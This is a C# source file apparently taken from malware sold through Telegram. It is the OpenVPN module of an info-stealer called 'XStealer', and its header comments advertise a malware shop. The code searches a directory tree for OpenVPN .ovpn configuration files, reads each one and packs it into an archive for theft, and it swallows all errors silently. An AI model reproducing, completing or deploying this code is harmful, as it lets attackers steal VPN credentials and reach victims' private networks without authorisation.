// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps.Vpn
{
    using System.IO;
    using Helpers;

    public static class OpenVpn
    {
        public static void Inizialize()
        {
            try
            {
                var directoryInfo = new DirectoryInfo(GlobalPaths.OpenPath);
                // Проверяем файл на существование
                if (directoryInfo.Exists)
                {
                    // Ищем в цикле все файлы с меткой ovpn
                    foreach (FileInfo ovpn in directoryInfo.GetFiles("*.ovpn", SearchOption.AllDirectories))
                    {
                        try
                        {
                            byte[] files = ConverterEx.ToBytes(false, ovpn.FullName);
                            ZipEx.AddKeyPairStream($"VPN/{Path.GetFileName(ovpn.FullName)}", files);
                        }
                        catch { continue; }
                    }
                }
            }
            catch { }
        }
    }
}